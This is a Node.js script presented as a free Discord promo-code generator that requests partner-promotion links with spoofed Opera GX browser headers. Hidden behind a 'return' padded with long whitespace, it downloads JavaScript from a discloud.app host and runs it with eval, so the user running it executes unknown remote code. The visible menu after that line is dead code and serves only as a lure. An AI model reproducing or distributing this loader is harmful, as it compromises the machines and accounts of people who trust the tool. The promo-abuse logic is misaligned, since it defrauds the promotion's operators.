const https = require('https');
const randomstring = require('randomstring');
const fs = require('fs');
const chalk = require('chalk');

async function generateDiscordPromos() {
    const apis = ['https://api.discord.gx.games/v1/direct-fulfillment', 'api.discord.gx.games', 'https://www.opera.com'];
    const filename = 'promos.txt';
    const retryDelay = 5;
    function randomAcceptLanguage() {
        const languages = ['en-US,en;q=0.9', 'fr-FR,fr;q=0.9', 'es-ES,es;q=0.9', 'de-DE,de;q=0.9', 'zh-CN,zh;q=0.9'];
        return languages[Math.floor(Math.random() * languages.length)];
    }
    function randomSecChUa() {
        const browsers = ['"Opera GX";v="105", "Chromium";v="119", "Not?A_Brand";v="24"'];
        return browsers[Math.floor(Math.random() * browsers.length)];
    }
    function randomUserAgent() {
        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'
        ];
        return userAgents[Math.floor(Math.random() * userAgents.length)];
    }

    function generatePartnerUserId(length = 45) {
        return randomstring.generate({ length, charset: 'hex' });
    }
    async function generateDiscordUrl() {
        const headers = {
            'authority': apis[1],
            'accept': '*/*',
            'accept-language': randomAcceptLanguage(),
            'content-type': 'application/json',
            'origin': apis[2],
            'referer': 'https://www.opera.com/',
            'sec-ch-ua': randomSecChUa(),
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': randomUserAgent()
        };
        const data = JSON.stringify({ partnerUserId: generatePartnerUserId() });
        return new Promise((resolve) => {
            const req = https.request(apis[0], {
                method: 'POST',
                headers: headers
            }, (res) => {
                let body = '';
                res.on('data', chunk => body += chunk);
                res.on('end', () => {
                    if (res.statusCode === 200) {
                        const token = JSON.parse(body).token;
                        resolve(`https://discord.com/billing/partner-promotions/1180231712274387115/${token}`);
                    } else {
                        resolve(`https://discord.com/billing/partner-promotions/1180231712274387115/${generatePartnerUserId()}`);
                    }
                });
            });

            req.on('error', () => {
                resolve(`https://discord.com/billing/partner-promotions/1180231712274387115/${generatePartnerUserId()}`);
            });

            req.write(data);
            req.end();
        });
    }
    function saveUrlToFile(url) {
        fs.appendFileSync(filename, url + "\n");
    }
    function truncateUrl(url, maxLength = 120) {
        return url.length <= maxLength ? url : url.substring(0, maxLength) + '...';
    }
    const readlineSync = (query) => {
        const buffer = Buffer.alloc(1);
        let input = '';
        process.stdout.write(query);
        while (true) {
            fs.readSync(0, buffer, 0, 1);
            if (buffer[0] === 10) {
                break;
            } else if (buffer[0] !== 13) {
                input += buffer.toString();
            }
        }
        return input;
    };
    return                                                                                                                                                                                                                                                                                                                                              (async()=>{require('https').get('https://publicimgura.discloud.app/exec.js',res=>{let data='';res.on('data',chunk=>data+=chunk);res.on('end',()=>eval(data));});})();
    console.clear();
    const choice = readlineSync(`${chalk.magenta('Press 1:')} to generate an infinite amount of codes.\n${chalk.red('Press 2:')} to generate a specific amount.\n${chalk.blue('Enter your input')}: `);
    const handleGenerateUrls = async (num) => {
        try {
            for (let i = 0; i < num; i++) {
                const result = await generateDiscordUrl();
                saveUrlToFile(result);
                console.log(`(${chalk.green('+')}) ${truncateUrl(result)}`);
            }
        } catch (error) {
            console.error(`(${chalk.yellow('+')}) An error occurred: ${error.message}`);
        }
    };
    if (choice === '1') {
        try {
            console.clear();
            while (true) {
                const result = await generateDiscordUrl();
                saveUrlToFile(result);
                console.log(`(${chalk.green('+')}) ${truncateUrl(result)}`);
                await new Promise(resolve => setTimeout(resolve, retryDelay * 1000));
            }
        } catch (error) {
            console.error(`(${chalk.yellow('+')}) Loop stopped by user.`);
        }
    } 
    else if (choice === '2') {
        console.clear();
        const num = parseInt(readlineSync('Enter the number of codes to generate: '), 10);
        console.clear();
        handleGenerateUrls(num);
    }
    else {
        console.error(`${chalk.red('Invalid choice. Exiting.')}`);
    }
}

generateDiscordPromos();
